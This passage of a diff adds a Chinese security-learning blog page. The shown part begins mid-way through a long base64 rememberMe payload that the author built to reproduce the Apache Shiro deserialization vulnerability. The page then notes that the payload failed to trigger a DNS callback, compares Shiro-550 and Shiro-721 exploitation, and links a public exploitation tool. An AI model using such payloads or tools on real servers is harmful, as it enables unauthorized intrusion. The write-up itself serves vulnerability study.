JQlYB3EFagNnAWIPPw05CzsJPAcwBTEDMAEjDzgNOAs4CTwHNQUzAzIBIA81DQwLKwkIBwQFBAMBARAPDw0MCw4JCAcHBQQDGAEQDwsNDAsMCQgHBwUEAwUBEA8ODQwLCAkIBw4FBAMGARAPDw0MCwcJAgcGBQ8DAgERDw4NAAsKCQgHBgUrAwIBEQ8ODQ0LCgkIBwYFAQMoAS8PDw0zCwoJCAcEBQQDDwEaDw4NDAsKCQ4HBgUFAwIBEA8ODSMLCgkGBwYFBAMCARwPDg0NCwoJCAcGBQEDAgEfDw4NNAsKCQgHBgUFAwIBAw8ODRgLCgkKBwYFCAMCARAPDg0zCwoJCAcGBQcDAgEQDw4NDQs1CQgHBgUGAwIBHQ8EDQwLCgkIBwAFBAMDARAPDg0MCz4JCAcIBQQDAgEQDy4NDAsJCQgHBgUEAwMBEA8BDQwLMgkIBwYFBAMCARAPDw0MCx8JCAcQBQQDAwEQDw4NDAsLCQgHEQUEAxoBEA8MDQwLEwkIBwYFBAMGARAPDw0MCxAJCAcHBQQDEQEQDxUNDAsICQgHCgUEAwIBEA9HDQwLCgkIBwIFBAMCARAPDw0zCwoJCAcEBQQDDwEaDw4NDAsKCQ4HBgUFAwIBEA8ODTQLCgkGBwYFBAMCAToPDg0ICwoJCAcGBQUDAgEfDw4NNAsKCQgHBgUEAwIBEQ8ODRkLCgkeBwYFBQMCARAPDg0NCwoJFAcGBRkDAgESDw4NDAsKCQkHBgUaAwIBDw8ODQ8LCgkRBwYFBAMCARQPDg0NCwoJEgcGBQwDAgE5Dw4NBwsKCQkHBgUIAwIBEA8ODSgLCgkLBwYFBgMCARAPDg0DCzUJCwcHBUgDPQE/DxwNPQs1CT0HUQU7AwIBEA8PDQwLPAkIBwYFBAMBARAPDw0PCwoJCgcGBSQDAgEQDw4NDgsKCSkHBgUVAwIBEA8ODQELAAkIBwcFBAMAARAPLQ0MCxoJCAcPBXEDcwEQD3ANDAsaCQgHBgUFA0NQkesxDQwLCgk6BwYFHwMPARoPDg0PCwoJHQcBBQQDFQEXDw4NFAsNCQgHHwUFAwIBAA99DWkLeAlhB2cFaANUAXUPfA1/C2MJZwdoBVEDSwFUDw8NDAsLCUIHBwUEAw8BGg9NDWMLZAl7B3IFZQNsAWQPWA1tC2YJfQdjBQEDcwGGnDENYQtNCRAHBwUEAwQBLA9nDWILYwl8BzgFBQMCARMPJg0lC1wJCQcGBQADQQF/D2oNaQsLCQgHCQVIA2sBfg9rDUILfwllB2QFYQNwAUQPbw1uC2YJbQcHBQQDEAFcD2ENbwtrCWQHUAVlA3ABeQ9vDW4LZgltB1IFZQNgAXwPaw0NCwoJDAdyBWwDawFjDw8NDAsJCU4HaQVrAwMBEA8CDUULZAlmB2MFdgNBAXwPbw1/C3kJbQd1BQUDAgE1D0INdQt5CWcHdQVhA3ABeQ9vDWALJQl4B2cFfQNuAX8Pbw1oC3kJJwdzBXADawF8DyENSwtrCWwHYQVhA3YBYw8qDUoLZQlnBz0FBQMCAR0PBA1fC2UJfQd0BWcDZwFWD2cNYAtvCQkHBgUIA0UBcQ9qDWsLbwl8B3UFKgNoAXEPeA1tCwYJCAcLBQ4DAgEbDwkNDAsQCQkHBgUnA3sBYw9hDX8Lbwl6B28FZQNuAT8Pfg1tC3MJZAdpBWUDZgFjDyENeQt+CWEHagUrA0UBcQ9qDWsLbwl8B3UFIANEAX8PYQ0NCwoJGAdsBWUDdAFxDyENYAtrCWYHYQUrA00Bcg9kDWkLaQl8BwcFBAMWAXoPbw16C2sJJwdvBWsDLQFDD2sNfgtjCWkHagVtA3gBcQ9sDWALbwkJBwYFGwN7AWMPYQ1/C28JegdvBWUDbgE/D34NbQtzCWQHaQVlA2YBYw8hDXkLfglhB2oFKwNFAXEPag1rC28JfAd1BQQDIwEQDwwNDAsJCQgHBwUEAwYBEA8PDQwLEAkIBwMFBAMEARAPDw0MCw0JCAcGBQQDAAEQDwYNDAsLCQgHBwUEAw8BGg8ODQcLCgkJBwYFCAMCARAPDg0jCwoJCQcGBQUDAgEQDw4NCQsgCTcHBwU7AwIBEA8MDQwLBwkCBwYFBAMCARYPDg0NCwoJCAcGBTgDAgEeDw4NDAsKCQQHBgUFAwIBEA8ODQkLCgkHBwYFFgMCARAPDg0OCwoJGwcGBQQDAgESDw4NGAsKCRkHBgUEAwIBHQ8EDQwLCwkIBwQFBAMUARAPHg0MCwMJeAdyBQQDBgFAD3kNYgt4CXgHcQUFAwIBaA9/DQwLdAkIBwsFDgN6AR0PBA0ABwYFBAsKCQgPDg0bGxsbGxsbGxsbGxsbGxsb</span><br></pre></td></tr></table></figure>
+
+<p>使用构造的rememberMe攻击字符串重新请求网站，但是这里没有成功触发payload，没有在在ceye中获取到ip值（估计不知道哪里操作失误了，大致思路就是这样操作。。）</p>
+<img src="/2022/05/31/22-0531-01/image-20220602230439944.png" alt="image-20220602230439944" style="zoom:80%;">
+
+<p>看网上一些复现文章用的dnslog平台（和用ceye.io是一样的），最后获取到了ip，如下：</p>
+<img src="/2022/05/31/22-0531-01/image-20220602230623171.png" alt="image-20220602230623171" style="zoom:80%;">
+
+<h2 id="shiro-550和shiro-721区别"><a href="#shiro-550和shiro-721区别" class="headerlink" title="shiro-550和shiro-721区别"></a>shiro-550和shiro-721区别</h2><p>Shiro-550：只需输入url，即可完成自动化检测和漏洞利用。</p>
+<p>Shiro-721：需输入url，提供一个有效的rememberMe Cookie（即需要一个正确的账号和密码），并指定目标操作系统类型。</p>
+<h2 id="利用工具检测shiro漏洞"><a href="#利用工具检测shiro漏洞" class="headerlink" title="利用工具检测shiro漏洞"></a>利用工具检测shiro漏洞</h2><p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p>
+<p>工具详细使用：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/142504.html">https://www.secpulse.com/archives/142504.html</a></p>
+<h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>由于复现设计到太多java知识，如JNDI、RMI等，复现起来实在头疼，所以了解java后，再进行复现</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1974944">https://cloud.tencent.com/developer/article/1974944</a></p>
+
+        </div>		
+		
+        <section class="post-tags">
+            <div>
+                <span>标签:</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="/">
+                    <i class="iconfont icon-home"></i>
+                    主页
+                </a>
+                <span>· </span>
+                <a href="javascript:window.history.back();">
+                    <i class="iconfont icon-back"></i>
+                    返回
+                </a>
+                
+                
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2022/05/29/22-0529-01/">汇编day9</a>
+            
+        </section>
+        <br>
+        
+            <section id="comments" class="comments">
+              <style>
+                  .comments{ margin-top: 30px;}
+                  .v .vlist .vcard .vcontent {padding-top: 0;}
+                  .vcontent p { color:grey; margin-bottom: 10px;}
+                  .v * {line-height: normal;}
+                  .v .vwrap  {border-radius: 0px; padding: 10px;}
+                  .v .vbtn {border-radius: 0px;}
+                  .v code, .v pre {border-radius: 0px;}
+                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
+                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
+                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
+                  .v .vlist .vcard {padding-top: 0;}
+                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
+                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
+              </style>
+              <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
+        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
+        placeholder: '想对作者说点什么...',
+        notify: 'false',
+        verify: 'false',
+        avatar: 'retro',
+        visitor: 'true'
+    });
+</script>
+            </section>
+        
+    </article>
+</div>
+
+
+
+<style>
+
+.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }
+
+</style>
+        </div>
+        <footer id="footer" class="footer">
+
+ <div class="copyright">
+
+ <span>© 𝐴_𝑌𝑢
+
+ <!-- 访客数量 -->
+
+ 
+
+ <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    | 总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    | 总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>
+
+
+ 
+
+ </span>
+
+ </div>
+
+</footer>
+    </div>
+</body>
+</html>
+
+
+	
+
+
+
+<script type="text/javascript" src="\js\jquery.js"></script>
+<script type="text/javascript" src="\js\jquery.min.js"></script>
+
+<script  type="text/javascript" src="\js\snow.js"></script>
+
